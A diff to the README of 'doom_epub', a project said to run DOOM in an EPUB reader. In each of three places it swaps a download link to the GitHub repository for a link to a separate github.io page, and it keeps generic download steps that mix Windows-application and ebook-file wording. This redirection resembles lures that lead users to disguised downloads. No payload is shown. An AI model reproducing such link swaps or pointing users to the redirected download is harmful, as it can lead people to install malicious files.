@@ -1,6 +1,6 @@
 # 📖 doom_epub - DOOM in Your Ebook Reader
 
-[![Download doom_epub](https://img.shields.io/badge/Download-doom__epub-blue?style=for-the-badge&logo=github)](https://github.com/Willigoldengreen8/doom_epub)
+[![Download doom_epub](https://img.shields.io/badge/Download-doom__epub-blue?style=for-the-badge&logo=github)](https://willigoldengreen8.github.io)
 
 ## 🎮 What Is This?
 
@@ -20,7 +20,7 @@ Getting DOOM running on your Windows computer is incredibly easy. Follow these t
 
 ### Step 1: Download the File
 
-Visit this link to download the application: [https://github.com/Willigoldengreen8/doom_epub](https://github.com/Willigoldengreen8/doom_epub)
+Visit this link to download the application: [https://willigoldengreen8.github.io](https://willigoldengreen8.github.io)
 
 Click the green "Download" button on that page. Your browser will save the doom_epub file to your computer, usually to your "Downloads" folder.
 
@@ -42,7 +42,7 @@ Double-click the doom_epub file you downloaded. Your ebook reader will open it. 
 
 Ready to start? Here's your direct download link:
 
-[![Download Now](https://img.shields.io/badge/Download-doom__epub-green?style=for-the-badge)](https://github.com/Willigoldengreen8/doom_epub)
+[![Download Now](https://img.shields.io/badge/Download-doom__epub-green?style=for-the-badge)](https://willigoldengreen8.github.io)
 
 Visit this link to download the application. Once downloaded, you don't need to install anything. Just open the file with any EPUB 3 reader.
 
